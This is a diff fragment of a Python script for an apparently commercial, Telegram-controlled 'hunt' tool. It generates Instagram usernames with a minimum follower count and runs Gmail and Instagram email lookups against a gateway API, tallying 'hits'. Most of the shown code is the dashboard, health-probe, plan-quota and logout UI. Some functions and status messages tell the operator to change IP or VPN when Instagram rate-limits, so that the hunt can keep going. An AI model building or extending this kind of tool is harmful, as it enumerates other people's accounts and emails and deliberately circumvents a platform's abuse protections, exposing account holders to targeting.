+        url = f"{base}{suffix}"
+        try:
+            response = api_session.get(url, timeout=req_timeout)
+            response.raise_for_status()
+            return response.json(), None
+        except Exception as exc:
+            last_err = str(exc)[:100]
+            continue
+    if not get_api_alive():
+        sync_api_auto_pause()
+    return None, last_err or "API unreachable on all hosts"
+
+
+def normalize_lookup_email(raw):
+    email = (raw or "").strip().lower()
+    if not email or "@" not in email:
+        return None
+    return email
+
+
+def format_lookup_result(kind, email, data, err=None):
+    if err:
+        return format_action_notice(f"{kind} lookup failed", err, "ERR")
+    status = data.get("status")
+    state = f"{S['live']} YES" if status is True else (
+        f"{S['idle']} NO" if status is False else str(status)
+    )
+    lines = [
+        format_panel_header(),
+        f"<b>◈ {kind.upper()} LOOKUP</b>\n\n",
+        tg_row("Email", html.escape(email)),
+        tg_row("Status", state),
+    ]
+    response_text = data.get("response")
+    if response_text:
+        snippet = html.escape(str(response_text)[:240])
+        lines.append(f"\n<i>{snippet}</i>\n")
+    if kind == "insta" and data.get("username"):
+        user = html.escape(str(data["username"]))
+        lines.append(tg_row("Username", f"@{user}"))
+    return "".join(lines)
+
+
+def cmd_lookup_gmail(email):
+    data, err = api_fetch_json("/gmail_lookup", {"email": email})
+    if err:
+        return format_lookup_result("gmail", email, {}, err)
+    return format_lookup_result("gmail", email, data)
+
+
+def cmd_lookup_insta(email):
+    data, err = api_fetch_json(HUNT_IG_LOOKUP_ROUTE, {"email": email})
+    if err:
+        return format_lookup_result("insta", email, {}, err)
+    return format_lookup_result("insta", email, data)
+
+
+def cmd_generate_batch(count, min_followers):
+    count = max(1, min(GEN_CMD_MAX_COUNT, int(count)))
+    min_followers = max(1, min(GEN_CMD_MAX_MIN, int(min_followers)))
+    if TELEGRAM_ENABLED:
+        ok, reason, info = plan_can_hunt()
+        if not ok:
+            return format_operator_plan_gate(reason or "daily_limit", info or {})
+    lines = [
+        format_panel_header(),
+        f"<b>◈ GENERATE · {count}×</b>\n\n",
+        tg_row("Min followers", str(min_followers)),
+        tg_row("API", get_api_base_url() or "—"),
+        "\n",
+    ]
+    errors = 0
+    for idx in range(1, count + 1):
+        if TELEGRAM_ENABLED:
+            ok, reason, pinfo = plan_acquire_generation()
+            if not ok:
+                lines.append(
+                    f"  {S['bullet']} <code>#{idx}</code>  "
+                    f"<i>{html.escape(reason or 'quota')}</i>\n"
+                )
+                break
+            quota_held = True
+        else:
+            quota_held = False
+        if not get_api_alive():
+            lines.append(
+                f"  {S['bullet']} <code>#{idx}</code>  "
+                f"<i>API offline — hunt auto-paused · start endpoint.py</i>\n"
+            )
+            break
+        data, err = api_fetch_json(
+            "/ig_gen",
+            {"min": min_followers},
+            timeout=_hunt_tool_timeout(),
+        )
+        if err:
+            if quota_held:
+                plan_release_generation()
+            lines.append(f"  {S['bullet']} <code>#{idx}</code>  <i>{html.escape(err)}</i>\n")
+            errors += 1
+            if not get_api_alive() or "API offline" in err:
+                break
+            continue
+        username = data.get("username") or "—"
+        if quota_held and (not username or username == "—"):
+            plan_release_generation()
+        info = data.get("info") or {}
+        name = html.escape(str(info.get("full_name") or "—"))
+        followers = info.get("follower_count", "—")
+        lines.append(
+            f"  {S['bullet']} <code>#{idx}</code>  "
+            f"<b>@{html.escape(str(username))}</b>  ·  {name}\n"
+            f"      followers <code>{html.escape(str(followers))}</code>\n"
+        )
+    if errors:
+        lines.append(f"\n<i>{errors} failed · max {GEN_CMD_MAX_COUNT} per /gen</i>\n")
+    return "".join(lines)
+
+
+def _clear_local_telegram_link_files():
+    clear_local_bot_token()
+    try:
+        if os.path.isfile(_device_chat_file()):
+            os.remove(_device_chat_file())
+    except OSError:
+        pass
+
+
+def finish_operator_logout_session():
+    """Stop bot poll and wipe local session — restart shows Telegram setup."""
+    clear_telegram_session()
+    clear_all_local_operator_state(mark_logged_out=True)
+    invalidate_operator_gate_cache()
+    license_invalidate_cache()
+    apply_worker_pause_state()
+    log_event("LOGOUT", "Local session cleared — link bot again on restart")
+
+
+def terminal_print_logout_confirm_box():
+    print()
+    for line in paint_action_box(
+        "LOG OUT",
+        [
+            ("Clears bot link + local session on this device.", ANSI_YELLOW),
+            ("Hit group stays on your Telegram ID in cloud (if linked).", ANSI_DIM),
+            ("Type y to confirm, anything else to cancel.", ANSI_DIM),
+        ],
+        ANSI_YELLOW,
+    ):
+        print(line)
+    print()
+
+
+def terminal_execute_logout(*, confirm=True):
+    """Terminal logout — wipe local .inpareto_* session (Telegram-ID keyed)."""
+    global _telegram_monitor_started
+    linked = TELEGRAM_ENABLED or has_local_operator_session() or _read_stored_chat_id()
+    if not linked:
+        print(apply_color("\n  Nothing to log out — no Telegram session on this device.\n", ANSI_DIM))
+        return False
+    if confirm:
+        terminal_print_logout_confirm_box()
+        ans = premium_input("Confirm logout", "y=yes  Enter=cancel").lower()
+        if ans not in ("y", "yes"):
+            print(apply_color("  Logout cancelled.\n", ANSI_DIM))
+            return False
+    saved_hg = preserve_operator_hit_group_for_user()
+    finish_operator_logout_session()
+    _telegram_monitor_started = False
+    rows = [("Local session cleared — link bot again on next start.", ANSI_GREEN)]
+    if saved_hg:
+        rows.append((f"Hit group saved on Telegram ID · {saved_hg}", ANSI_GREEN))
+    print()
+    for line in paint_action_box("LOGGED OUT", rows, ANSI_GREEN):
+        print(line)
+    print()
+    return True
+
+
+TERMINAL_MENU_HINT = "1=panel  2=status  l=logout  q=quit"
+TERMINAL_WAIT_HINT = "Enter=refresh  l=logout  q=quit"
+
+
+def cmd_logout_operator():
+    """Telegram logout confirm: clears local session only (device hash removed)."""
+    support = resolve_support_contact_html()
+    return True, format_action_notice(
+        "Logged out",
+        "Telegram unlinked on this device.\n\n"
+        f"<b>Data cleared on this device.</b> To restore access, contact support: {support}\n\n"
+        f"<b>Next step:</b> stop the script (menu {tg_code('q')}) and run "
+        f"{tg_code('python joint.py')} again — use cloud restore with your Telegram ID "
+        f"or link your bot when asked.",
+        "OK",
+        detail_html=True,
+    )
+
+
+def _run_api_probe():
+    global _api_probe_fail_streak
+    ok = False
+    base = None
+    via = None
+    for host in api_target_hosts():
+        try:
+            response = _api_probe_session.get(
+                f"http://{host}/alive",
+                timeout=API_PROBE_TIMEOUT,
+            )
+            if response.ok and response.json().get("alive") is True:
+                ok = True
+                base = f"http://{host}"
+                if host.startswith("127.") or host.startswith("localhost"):
+                    via = "local"
+                else:
+                    via = "public"
+                break
+        except Exception:
+            continue
+    if ok:
+        _api_probe_fail_streak = 0
+    elif _hunt_recently_ok() or _hunt_in_network_blip():
+        return
+    else:
+        _api_probe_fail_streak += 1
+    with _health_lock:
+        _health_cache["api"] = ok
+        _health_cache["api_base"] = base
+        _health_cache["api_via"] = via
+        _health_cache["api_at"] = time.time()
+
+
+def _run_cloud_probe():
+    if not is_cloud_enabled():
+        with _health_lock:
+            _health_cache["cloud"] = False
+            _health_cache["cloud_at"] = time.time()
+        return
+    ok = False
+    try:
+        response = requests.get(
+            f"{SUPABASE_URL}/rest/v1/app_settings",
+            headers=supabase_headers(),
+            params={"select": "key", "limit": "1"},
+            timeout=CLOUD_PROBE_TIMEOUT,
+        )
+        ok = response.ok
+    except Exception:
+        ok = False
+    with _health_lock:
+        _health_cache["cloud"] = ok
+        _health_cache["cloud_at"] = time.time()
+
+
+def _health_monitor_loop():
+    while True:
+        _run_api_probe()
+        sync_api_auto_pause()
+        _run_cloud_probe()
+        with _health_lock:
+            api_ok = _health_cache["api"]
+            cloud_ok = _health_cache["cloud"]
+        if _api_auto_paused or not api_ok or _hunt_recently_ok():
+            delay = PROBE_INTERVAL_FAIL
+        else:
+            delay = PROBE_INTERVAL_OK if cloud_ok else PROBE_INTERVAL_FAIL
+        time.sleep(delay)
+
+
+def start_health_monitor():
+    threading.Thread(target=_health_monitor_loop, daemon=True).start()
+
+
+def get_api_alive_cached():
+    """Read cached API state only — never blocks on /alive (live panel safe)."""
+    if _hunt_recently_ok():
+        return True
+    with _health_lock:
+        cached = _health_cache["api"]
+    if cached is None:
+        return False
+    return bool(cached)
+
+
+def get_api_alive():
+    if _hunt_recently_ok():
+        return True
+    with _health_lock:
+        cached = _health_cache["api"]
+        age = time.time() - _health_cache.get("api_at", 0)
+    stale = 3 if _IS_TERMUX else 6
+    if cached is None or (not cached and age > stale):
+        refresh_api_probe(force=True)
+    with _health_lock:
+        return bool(_health_cache["api"])
+
+
+def get_cloud_alive():
+    with _health_lock:
+        if _health_cache["cloud"] is None:
+            return False
+        return bool(_health_cache["cloud"])
+
+
+def probe_api_alive():
+    return get_api_alive()
+
+
+def probe_cloud_alive():
+    return get_cloud_alive()
+
+
+def cloud_power_label():
+    if not is_cloud_enabled():
+        return "◌ OFF  no creds", ANSI_RED
+    with _health_lock:
+        cloud_state = _health_cache["cloud"]
+    if cloud_state is None:
+        return "◌ …  checking", ANSI_DIM
+    if get_cloud_alive():
+        return "● ON  reachable", ANSI_GREEN
+    return "◌ OFF  unreachable", ANSI_RED
+
+
+def api_power_label():
+    with _health_lock:
+        api_state = _health_cache["api"]
+    if api_state is None:
+        return "◌ …  checking", ANSI_DIM
+    api_check = get_api_alive_cached if JACK_PANEL_LIVE else get_api_alive
+    if not api_check():
+        return "◌ OFF  dead", ANSI_RED
+    via = _health_cache.get("api_via")
+    if via == "local":
+        return f"● ON  local :{port}", ANSI_GREEN
+    if via == "public":
+        return f"● ON  public {ip}", ANSI_GREEN
+    return "● ON  alive", ANSI_GREEN
+
+
+def cloud_sync_label():
+    if not is_cloud_enabled():
+        return "◌ OFF", ANSI_DIM
+    with _health_lock:
+        cloud_state = _health_cache["cloud"]
+    if cloud_state is None:
+        return "◌ …  checking", ANSI_DIM
+    if not get_cloud_alive():
+        return "◌ OFF  cloud down", ANSI_RED
+    if is_device_ready():
+        return "● ON  synced", ANSI_GREEN
+    return "● ON  partial", ANSI_YELLOW
+
+
+def _dashboard_free_plan_snap(user_id):
+    row = plan_fetch_free_row(user_id, registry=None, online=False)
+    day_count, _today = plan_free_day_count(row)
+    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
+    now = datetime.now(timezone.utc)
+    return {
+        "plan": PLAN_FREE,
+        "tier": PLAN_FREE,
+        "day_count": day_count,
+        "limit": FREE_DAILY_GEN_LIMIT,
+        "trial_expired": plan_free_trial_expired(row),
+    }
+
+
+def _dashboard_local_premium_snap(user_id):
+    """Fast premium check from local license file only."""
+    local = read_local_license()
+    if not local or str(local.get("user_id")) != user_id:
+        return None
+    exp = license_parse_iso(local.get("expires_at"))
+    if exp is None or exp > datetime.now(timezone.utc):
+        return {"tier": PLAN_PREMIUM, "plan": PLAN_PREMIUM, "active": True}
+    return None
+
+
+def _dashboard_plan_snapshot(user_id):
+    """Plan row for panel — live mode avoids cloud locks; sticky premium prevents flash."""
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return {}
+    now = time.time()
+    cached = _dashboard_plan_cache
+    if (
+        cached.get("uid") == user_id
+        and cached.get("snap")
+        and now - float(cached.get("at") or 0) < DASHBOARD_PLAN_CACHE_TTL
+    ):
+        return dict(cached["snap"])
+    if admin_is_admin(user_id):
+        snap = {"tier": "admin", "plan": PLAN_PREMIUM}
+    elif not JACK_PANEL_LIVE:
+        try:
+            snap = plan_build_snapshot(user_id)
+        except Exception:
+            snap = _dashboard_local_premium_snap(user_id) or _dashboard_free_plan_snap(user_id)
+    else:
+        premium = _dashboard_local_premium_snap(user_id)
+        if premium:
+            snap = premium
+        elif (
+            cached.get("uid") == user_id
+            and (cached.get("snap") or {}).get("plan") == PLAN_PREMIUM
+            and now - float(cached.get("at") or 0) < DASHBOARD_PLAN_STICKY_PREMIUM_SEC
+        ):
+            snap = dict(cached["snap"])
+        else:
+            snap = _dashboard_free_plan_snap(user_id)
+    _dashboard_plan_cache.update(uid=user_id, snap=snap, at=now)
+    return dict(snap)
+
+
+def build_session_rows(uptime, status_text, status_color):
+    cloud_text, cloud_color = cloud_power_label()
+    api_text, api_color = api_power_label()
+    sync_text, sync_color = cloud_sync_label()
+    uid = resolve_operator_telegram_id()
+    plan_info = _dashboard_plan_snapshot(uid) if uid else {}
+    if plan_info.get("tier") == "admin":
+        plan_text, plan_color = "Admin", ANSI_MAGENTA
+    elif plan_info.get("plan") == PLAN_PREMIUM:
+        plan_text, plan_color = "Premium", ANSI_GREEN
+    elif plan_info.get("plan") == PLAN_FREE:
+        used = int(plan_info.get("day_count") or 0)
+        limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
+        if plan_info.get("trial_expired"):
+            plan_text, plan_color = "Free · expired", ANSI_RED
+        elif used >= limit:
+            plan_text, plan_color = f"Free · {used:,}/{limit:,}", ANSI_RED
+        else:
+            plan_text, plan_color = f"Free · {used:,}/{limit:,}", ANSI_YELLOW
+    else:
+        plan_text, plan_color = "—", ANSI_DIM
+    rows = [
+        ("Status", f"{'●' if not paused else '◌'} {status_text}", status_color),
+        ("Plan", plan_text, plan_color),
+        ("Uptime", uptime, ANSI_CYAN),
+        ("Cloud", cloud_text, cloud_color),
+        ("API", api_text, api_color),
+        ("Sync", sync_text, sync_color),
+    ]
+    base = get_api_base_url()
+    api_alive = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
+    rows.append(("Active", base.replace("http://", ""), ANSI_GREEN if api_alive else ANSI_YELLOW))
+    if ip != "127.0.0.1":
+        rows.append(("Registered", f"{ip}:{port}", ANSI_CYAN))
+    rows.extend([
+        ("Threads", str(THREAD_COUNT), ANSI_BLUE),
+        ("Timeout", f"{TIMEOUT}s", ANSI_BLUE),
+        ("Telegram", "enabled" if TELEGRAM_ENABLED else "disabled",
+         ANSI_GREEN if TELEGRAM_ENABLED else ANSI_DIM),
+    ])
+    if DEVICE_HASH:
+        rows.append(("Device", f"{DEVICE_HASH[:16]}…", ANSI_CYAN))
+    if is_device_ready():
+        rows.append(("Operator", resolve_operator_id(TELEGRAM_CHAT_ID)[:34], ANSI_MAGENTA))
+    return rows
+
+
+def build_core_rows(generated, valid_count, hits_count, error_count, bar_w=14):
+    rows = [
+        ("Generated", f"{generated:>6}  {make_colored_bar(generated, max(generated, 1000), bar_w, ANSI_GREEN)}", None),
+        ("Valid", f"{valid_count:>6}  {make_colored_bar(valid_count, max(valid_count, 100), bar_w, ANSI_CYAN)}", None),
+        ("Hits", f"{hits_count:>6}  {make_colored_bar(hits_count, max(hits_count, 50), bar_w, ANSI_GREEN)}", None),
+    ]
+    if error_count > 0:
+        rows.append(("Errors", f"{error_count:>6}  {make_colored_bar(error_count, max(error_count, 100), bar_w, ANSI_RED)}", None))
+    else:
+        rows.append(("Health", f"{'CLEAN':>6}  {apply_color('▰' * bar_w, ANSI_GREEN)}", None))
+    return rows
+
+
+def _hunt_pace_label(*, generated=None) -> tuple[str, str]:
+    generated = int(generated if generated is not None else gen)
+    elapsed = max(0.1, (datetime.now(timezone.utc) - START_TIME).total_seconds())
+    session_rate = generated / elapsed * 60.0
+    idle = max(0.0, time.monotonic() - _last_gen_at)
+    pulse_elapsed = max(0.1, time.monotonic() - _pulse_last_at)
+    pulse_delta = max(0, generated - _pulse_last_gen)
+    recent_rate = pulse_delta / pulse_elapsed * 60.0
+    rate_show = recent_rate if pulse_delta > 0 else session_rate
+    if idle > 30:
+        color = ANSI_RED
+        text = f"{rate_show:>4.0f}/min · idle {idle:.0f}s"
+    elif idle > 12:
+        color = ANSI_YELLOW
+        text = f"{rate_show:>4.0f}/min · idle {idle:.0f}s"
+    else:
+        color = ANSI_GREEN
+        text = f"{rate_show:>4.0f}/min"
+    return text, color
+
+
+def build_performance_rows(success_pct, hit_pct, valid_pct, bar_w=14, *, generated=None):
+    hit_color = ANSI_GREEN if hit_pct > 50 else ANSI_YELLOW
+    pace_text, pace_color = _hunt_pace_label(generated=generated)
+    return [
+        ("Pace", pace_text, pace_color),
+        ("Success", f"{success_pct:>5.1f}% {make_colored_bar(success_pct, 100, bar_w, ANSI_CYAN)}", None),
+        ("Hit rate", f"{hit_pct:>5.1f}% {make_colored_bar(hit_pct, 100, bar_w, hit_color)}", None),
+        ("Valid/Hits", f"{valid_pct:>5.1f}% {make_colored_bar(valid_pct, 100, bar_w, ANSI_CYAN)}", None),
+    ]
+
+
+def dashboard_card_inner_width():
+    """Use full terminal width — same span as the two cards above + footer."""
+    try:
+        cols = os.get_terminal_size().columns
+    except OSError:
+        cols = 80
+    # Align with ACTION_BOX_W / side-by-side row (~68–73 chars content)
+    return max(min(cols - 4, ACTION_BOX_W - 4), 68)
+
+
+def clip_event_log_line(event, max_len):
+    text = str(event)
+    if len(text) <= max_len:
+        return text
+    return text[: max(max_len - 1, 8)] + "…"
+
+
+def build_event_rows(events, value_w=None):
+    if value_w is None:
+        value_w = dashboard_card_inner_width() - 14
+    rows = []
+    for event in _operator_visible_events(events)[-4:]:
+        color = ANSI_RED if "ERROR" in event else (
+            ANSI_GREEN if "HIT" in event and "] ADMIN" not in event.upper() else ANSI_YELLOW
+        )
+        label = "Event" if not rows else f"Log {len(rows) + 1}"
+        rows.append((label, clip_event_log_line(event, value_w), color))
+    return rows
+
+
+def _event_log_card_lines(events):
+    inner = dashboard_card_inner_width()
+    label_w = 11
+    value_w = max(inner - label_w - 3, 40)
+    lines = list(paint_info_card(build_event_rows(events, value_w), label_w, value_w))
+    lines.append("")
+    return lines
+
+
+def print_event_log_card(events):
+    for line in _event_log_card_lines(events):
+        print(line)
+
+
+def _hunt_buffer_depth():
+    buf = _hunt_gateway_meta.get("buffer")
+    try:
+        return int(buf) if buf is not None else None
+    except (TypeError, ValueError):
+        return None
+
+
+def _hunt_buffer_healthy():
+    depth = _hunt_buffer_depth()
+    return depth is not None and depth >= HUNT_KEEPALIVE_BUFFER_MIN
+
+
+def _hunt_gen_recently_active(idle_sec=None):
+    """True while hunt is actively generating — hit enrich must stay lightweight."""
+    limit = idle_sec if idle_sec is not None else (120 if _IS_TERMUX else 90)
+    return time.monotonic() - _last_gen_at < limit
+
+
+def _hit_pipeline_light_only():
+    """During hot hunt: caption edit only — no graphql/mobile/deep work."""
+    return _workers_started and _hunt_gen_recently_active()
+
+
+def _hunt_active_session():
+    """Hunt was running recently — avoid auto-pausing on probe blips."""
+    if not _workers_started or is_locally_logged_out() or _user_manual_paused:
+        return False
+    if _hunt_recently_ok():
+        return True
+    if _hunt_buffer_healthy():
+        return True
+    idle = time.monotonic() - _last_gen_at
+    with lock:
+        generated = int(gen)
+    if generated > 0 and idle < HUNT_KEEPALIVE_IDLE_SEC:
+        return True
+    if JACK_PANEL_LIVE and pause_event.is_set() and idle < HUNT_KEEPALIVE_IDLE_SEC:
+        return True
+    return False
+
+
+def _refresh_hunt_gateway_meta(force=False):
+    global _hunt_gateway_meta
+    now = time.time()
+    if not force and now - float(_hunt_gateway_meta.get("updated") or 0) < 4.0:
+        return
+    data, _ = api_fetch_json(
+        "/alive",
+        timeout=(HUNT_CONNECT_TIMEOUT, 4),
+    )
+    if not isinstance(data, dict):
+        return
+    depth_map = (data.get("speed") or {}).get("buffer_depth") or {}
+    depth = 0
+    if isinstance(depth_map, dict) and depth_map:
+        try:
+            depth = max(int(v or 0) for v in depth_map.values())
+        except (TypeError, ValueError):
+            depth = 0
+    _hunt_gateway_meta = {
+        "buffer": depth,
+        "ig_block": float(data.get("ig_block_sec") or 0.0),
+        "updated": now,
+    }
+
+
+def _operator_hunt_trusted():
+    """Verified session — don't stall hunt on transient ACCESS_BLOCKED during live panel."""
+    if not TELEGRAM_ENABLED:
+        return True
+    uid = resolve_operator_telegram_id()
+    if not uid:
+        return False
+    if admin_is_admin(uid):
+        return True
+    return bool(
+        read_operator_session_verified(uid)
+        or operator_access_sticky_active()
+        or _access_trust_grace_active()
+    )
+
+
+def _hunt_health_snapshot(*, live=False):
+    """Unified hunt state for panel header, probe row, and block reason."""
+    idle = time.monotonic() - _last_gen_at
+    meta = _hunt_gateway_meta
+    buf = meta.get("buffer")
+    ig_block = float(meta.get("ig_block") or 0.0)
+    workers = len(worker_threads) or THREAD_COUNT
+    api_ok = get_api_alive_cached() if live else get_api_alive()
+    block = None
+    hunt_lbl = f"active · {workers}w"
+    hunt_color = ANSI_GREEN
+    status_text = "RUNNING"
+    status_color = ANSI_GREEN
+
+    if not _workers_started:
+        block = "workers not started"
+        hunt_lbl, hunt_color = "standby", ANSI_YELLOW
+        status_text, status_color = "STANDBY", ANSI_YELLOW
+    elif is_locally_logged_out():
+        block = "logged out"
+        hunt_lbl, hunt_color = "logged out", ANSI_RED
+        status_text, status_color = "LOGGED OUT", ANSI_RED
+    elif TELEGRAM_ENABLED and (uid := resolve_operator_telegram_id()) and operator_ban_active(uid, force=False):
+        block = "suspended — contact admin"
+        hunt_lbl, hunt_color = "suspended", ANSI_RED
+        status_text, status_color = "SUSPENDED", ANSI_RED
+    elif _api_auto_paused:
+        block = "API offline — run endpoint.py"
+        hunt_lbl, hunt_color = "API offline", ANSI_RED
+        status_text, status_color = "API OFF", ANSI_RED
+    elif _user_manual_paused:
+        block = "paused (manual)"
+        hunt_lbl, hunt_color = "standby (paused)", ANSI_YELLOW
+        status_text, status_color = "PAUSED", ANSI_YELLOW
+    elif _hunt_in_ip_change_pause():
+        left = _hunt_ip_change_pause_left()
+        mins = int(left // 60)
+        secs = int(left % 60)
+        block = f"Instagram rate limited — change IP ({mins}m{secs:02d}s)"
+        hunt_lbl = f"CHANGE IP · {mins}m{secs:02d}s"
+        hunt_color = ANSI_RED
+        status_text, status_color = "CHANGE IP", ANSI_RED
+    elif not api_ok and not _hunt_recently_ok():
+        if _local_gateway_mode() and pause_event.is_set():
+            block = None
+        else:
+            block = "API unreachable"
+            hunt_lbl, hunt_color = "API down", ANSI_RED
+            status_text, status_color = "API DOWN", ANSI_RED
+    elif TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
+        block = "access gate — finish Telegram setup"
+        hunt_lbl, hunt_color = "access gate", ANSI_YELLOW
+        status_text, status_color = "ACCESS GATE", ANSI_YELLOW
+    elif not pause_event.is_set():
+        block = "workers on standby — /resume or open Live Panel"
+        hunt_lbl, hunt_color = "standby", ANSI_YELLOW
+        status_text, status_color = "STANDBY", ANSI_YELLOW
+    elif idle > 8 and (api_ok or _hunt_recently_ok() or _hunt_active_session()):
+        # Live panel: keep RUNNING — transient hunt states only in probe row, not status card.
+        soft_hunt = live and pause_event.is_set() and _workers_started
+        if ig_block > 1.0:
+            hunt_lbl = f"IG cooldown {ig_block:.0f}s"
+            hunt_color = ANSI_RED
+            if not soft_hunt:
+                block = f"IG cooldown {ig_block:.0f}s"
+                status_text, status_color = f"IG COOLDOWN {ig_block:.0f}s", ANSI_RED
+        elif buf is not None and buf >= 1600 and idle > 25 and not pause_event.is_set():
+            hunt_lbl = f"paused · buf {buf} full"
+            hunt_color = ANSI_YELLOW
+            if not soft_hunt:
+                status_text, status_color = "PAUSED", ANSI_YELLOW
+        elif buf is not None and buf >= 1600 and idle > 25:
+            hunt_lbl = f"backlog · {workers}w · buf {buf}"
+            hunt_color = ANSI_YELLOW if idle < 60 else ANSI_RED
+            if not soft_hunt and idle > 90:
+                block = f"endpoint backlog · buf {buf} — not an IP issue"
+        elif buf is not None and buf > 400 and idle > 60:
+            hunt_lbl = f"slow drain · buf {buf}"
+            hunt_color = ANSI_YELLOW
+        elif (
+            _IS_TERMUX
+            and buf is not None
+            and buf >= TERMUX_BUFFER_NEAR_FULL
+            and idle < 25
+            and not block
+        ):
+            hunt_lbl = f"lookup bound · buf {buf}"
+            hunt_color = ANSI_YELLOW
+        elif buf is not None and buf < 8:
+            hunt_lbl = "buffer empty"
+            hunt_color = ANSI_YELLOW
+            if not soft_hunt:
+                block = "IG buffer empty"
+                status_text, status_color = "BUF EMPTY", ANSI_YELLOW
+        elif idle > 22:
+            hunt_lbl = f"idle {idle:.0f}s"
+            hunt_color = ANSI_RED
+            if not soft_hunt:
+                block = f"gen idle {idle:.0f}s"
+                status_text, status_color = f"GEN IDLE {idle:.0f}s", ANSI_RED
+        elif buf is not None:
+            hunt_lbl = f"active · {workers}w · buf {buf}"
+    with _hunt_inflight_lock:
+        inflight = int(_hunt_inflight)
+    if (
+        inflight >= max(8, HUNT_GATEWAY_CONCURRENCY // 2)
+        and not block
+        and pause_event.is_set()
+    ):
+        hunt_lbl = f"busy · {inflight}/{HUNT_GATEWAY_CONCURRENCY} slots"
+        hunt_color = ANSI_CYAN
+
+    return {
+        "block": block,
+        "hunt_lbl": hunt_lbl[:28],
+        "hunt_color": hunt_color,
+        "status_text": status_text[:22],
+        "status_color": status_color,
+        "idle": idle,
+        "buf": buf,
+    }
+
+
+def _hunt_block_reason_live():
+    """Fast hunt status for live panel — no license/cloud probes on redraw."""
+    return _hunt_health_snapshot(live=True).get("block")
+
+
+def _paint_dashboard_footer_live():
+    """Live footer — never swap to a blocking HUNT screen; hunt state stays in probe row."""
+    if _hunt_in_ip_change_pause():
+        left = _hunt_ip_change_pause_left()
+        mins = int(left // 60)
+        secs = int(left % 60)
+        return paint_action_box(
+            "CHANGE IP",
+            [
+                (
+                    f"Instagram rate limited {HUNT_IG_RATE_LIMIT_STREAK_TRIGGER}× — hunt paused.",
+                    ANSI_RED,
+                ),
+                (
+                    f"Rotate VPN / mobile data · auto-resume in {mins}m{secs:02d}s",
+                    ANSI_YELLOW,
+                ),
+            ],
+            ANSI_RED,
+        )
+    if TELEGRAM_ENABLED and ACCESS_BLOCKED and _operator_hunt_trusted():
+        return paint_action_box(
+            "TELEGRAM",
+            [
+                ("Cloud/TG blip — hunt continues on verified session.", ANSI_YELLOW),
+                ("Bot replies retry automatically when network returns.", ANSI_DIM),
+            ],
+            ANSI_CYAN,
+        )
+    if TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
+        return paint_action_box(
+            "ACCESS PENDING",
+            [("Complete setup in Telegram bot.", ANSI_YELLOW)],
+            ANSI_YELLOW,
+        )
+    if not get_api_alive_cached() and not _hunt_recently_ok():
+        return paint_action_box(
+            "API OFFLINE",
+            [
+                ("Gateway not responding — start endpoint.py on this machine.", ANSI_RED),
+                (f"Tried: {', '.join(api_target_hosts())}", ANSI_YELLOW),
+            ],
+            ANSI_RED,
+        )
+    return paint_action_box(
+        "TELEGRAM",
+        [
+            ("Remote control active — send /help in your linked chat.", ANSI_GREEN),
+            ("Terminal: Ctrl+C → menu · l=logout", ANSI_DIM),
+        ],
+        ANSI_CYAN,
+    )
+
+
+def build_probe_rows():
+    api_ok = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
+    cloud_ok = get_cloud_alive()
+    via = _health_cache.get("api_via") or "none"
+    if JACK_PANEL_LIVE:
+        snap = _hunt_health_snapshot(live=True)
+        hunt_lbl = snap["hunt_lbl"]
+        hunt_color = snap["hunt_color"]
+    else:
+        block = hunt_block_reason()
+        if block:
+            hunt_lbl = block[:28]
+            hunt_color = ANSI_YELLOW if "cooldown" not in block.lower() else ANSI_RED
+        elif paused:
+            hunt_lbl = "standby (paused)"
+            hunt_color = ANSI_YELLOW
+        else:
+            n = len(worker_threads) or THREAD_COUNT
+            meta = _hunt_gateway_meta
+            buf = meta.get("buffer")
+            buf_tag = f" · buf {buf}" if buf is not None else ""
+            hunt_lbl = f"active · {n}w{buf_tag}"
+            hunt_color = ANSI_GREEN
+    if api_ok:
+        api_lbl = f"live via {via}"
+    elif _local_gateway_mode() and pause_event.is_set():
+        api_lbl = "live · local hunt"
+    else:
+        api_lbl = f"down via {via}"
+    ig_block = float(_hunt_gateway_meta.get("ig_block") or 0.0)
+    if _hunt_in_ip_change_pause():
+        left = _hunt_ip_change_pause_left()
+        hunt_lbl = f"CHANGE IP · {int(left // 60)}m{int(left % 60):02d}s"
+        hunt_color = ANSI_RED
+    elif api_ok and ig_block > 1.0:
+        api_lbl = f"live · IG {ig_block:.0f}s"
+    return [
+        ("Hunt", hunt_lbl, hunt_color),
+        ("API probe", api_lbl, ANSI_GREEN if api_ok else ANSI_RED),
+        ("Cloud probe", "live" if cloud_ok else "down",
+         ANSI_GREEN if cloud_ok else ANSI_RED),
+    ]
+
+
+def paint_dashboard_footer():
+    if TELEGRAM_ENABLED and ACCESS_BLOCKED:
+        rows = build_terminal_access_notice_rows()
+        if rows:
+            return paint_action_box(_terminal_notice_title(rows), rows, ANSI_YELLOW)
+        return paint_action_box(
+            "ACCESS PENDING",
+            [("Complete setup in Telegram bot.", ANSI_YELLOW)],
+            ANSI_YELLOW,
+        )
+    api_alive = get_api_alive_cached() if JACK_PANEL_LIVE else get_api_alive()
+    if not api_alive:
+        return paint_action_box(
+            "API OFFLINE",
+            [
+                ("Gateway not responding — start endpoint.py on this machine.", ANSI_RED),
+                (f"Tried: {', '.join(api_target_hosts())}", ANSI_YELLOW),
+            ],
+            ANSI_RED,
+        )
+    block = hunt_block_reason()
+    if block and block != "workers not started":
+        return paint_action_box(
+            "HUNT BLOCKED",
+            [(block, ANSI_YELLOW)],
+            ANSI_YELLOW,
+        )
+    if TELEGRAM_ENABLED and operator_access_ok():
+        return paint_action_box(
+            "TELEGRAM",
+            [
+                ("Remote control active — send /help in your linked chat.", ANSI_GREEN),
+                ("Terminal: l = log out this device", ANSI_DIM),
+            ],
+            ANSI_CYAN,
+        )
+    if ip == "127.0.0.1":
+        return paint_action_box(
+            "SETUP",
+            [("Run endpoint.py first to register the cloud API host.", ANSI_YELLOW)],
+            ANSI_YELLOW,
+        )
+    return paint_action_box(
+        "SESSION",
+        [("Live operations running — Ctrl+C stops this session.", ANSI_GREEN)],
+        ANSI_CYAN,
+    )
+
+
+def premium_input(label, hint=""):
+    print(apply_color(f"  ▸ {label}", ANSI_CYAN))
+    if hint:
+        print(apply_color(f"    {hint}", ANSI_DIM))
+    try:
+        return input(apply_color("    › ", ANSI_YELLOW)).strip()
